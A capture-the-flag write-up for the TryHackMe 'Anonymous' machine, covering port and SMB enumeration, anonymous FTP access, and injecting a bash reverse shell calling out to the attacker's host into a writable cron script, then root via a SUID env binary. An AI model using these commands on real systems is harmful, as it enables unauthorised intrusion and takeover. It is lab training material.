# Anonymous

## Task 1 - Pwn
```
export IP=10.10.224.99
```

### 1 - Enumerate the machine.  How many ports are open?
Initial nmap scan:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Anonymous$ nmap -sC -sV -Pn -n -oN nmap/initial -T4 $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 00:24 MDT
Nmap scan report for 10.10.224.99
Host is up (0.16s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts [NSE: writeable]
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.21.42
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1m01s, deviation: 1s, median: -1m02s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-05-28T06:23:31+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-05-28T06:23:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.91 seconds
```

### 2 - What service is running on port 21?
```
ftp
```

### 3 - What service is running on ports 139 and 445?
```
smb
```

### 4 - There's a share on the user's computer.  What's it called?
Running enum4linux gives us this info -- `enum4linux -a $IP`:

```bash
=========================================
|    Share Enumeration on 10.10.224.99    |
 =========================================

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	pics            Disk      My SMB Share Directory for Pics
	IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.224.99
//10.10.224.99/print$	Mapping: DENIED, Listing: N/A
//10.10.224.99/pics	Mapping: OK, Listing: OK
//10.10.224.99/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
```

### 5 - user.txt
We can log into the FTP service with the Anonymous user and no password, in their we find a directory named `scripts`:

I started by logging in with smbclient to the device since `enum4linux` found some password combos, and the `pics` share had two photos. Doing some lowing hanging fruit stegonography with exiftools, strings, then steghide and stegcracker did not give any results. Quickly gave up on SMB and began to look at FTP.

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 scripts
226 Directory send OK.
```

Moving into the `scripts` directory we can get all that is in there:

```bash
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 May 17 21:30 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 May 14 14:52 clean.sh
-rw-rw-r--    1 1000     1000          129 May 28 06:25 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> mget .
mget clean.sh? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (132.9175 kB/s)
mget removed_files.log? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (129 bytes).
226 Transfer complete.
129 bytes received in 0.00 secs (108.9763 kB/s)
mget to_do.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.05 secs (1.3644 kB/s)
```

Doesn't seem to be anything useful in those files, but there is. This scripts directory smells like a cron job to me. Looking at the log file we can see a couple of messages. Looking at the source of `clean.sh`:

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

If this is indeed a cron job, then we can put a bash reverse shell in this script, upload it to the directory since we have write permissions, and if there is a cronjob running the `clean.sh` script then the cronjob will execute it for us and give us a reverse shell. The modified script looks like this:

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.8.21.42/1234 0>&1
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

After putting this file back into the FTP server, after some short time it executes and we get the reverse shell to find the flag:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Anonymous$ nc -lvp 1234
listening on [any] 1234 ...
10.10.224.99: inverse host lookup failed: Unknown host
connect to [10.8.21.42] from (UNKNOWN) [10.10.224.99] 58014
bash: cannot set terminal process group (2085): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ id
id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
namelessone@anonymous:~$ ls
ls
pics
user.txt
namelessone@anonymous:~$ cat user.txt
cat user.txt
90d6f992585815ff991e68748c414740
```


### 6 - root.txt
Once we are on the box we can copy over linpeas and begin to enumerate the system. Once we run linpeas we find that `/usr/bin/env` has the SUID bit set. Using [GTFOBins](https://gtfobins.github.io/gtfobins/env/) we can easily get a root shell using this SUID binary:

```bash
namelessone@anonymous:/tmp$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
# id
id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

Now we just need to get the flag:

```bash
# cat /root/root.txt
cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```
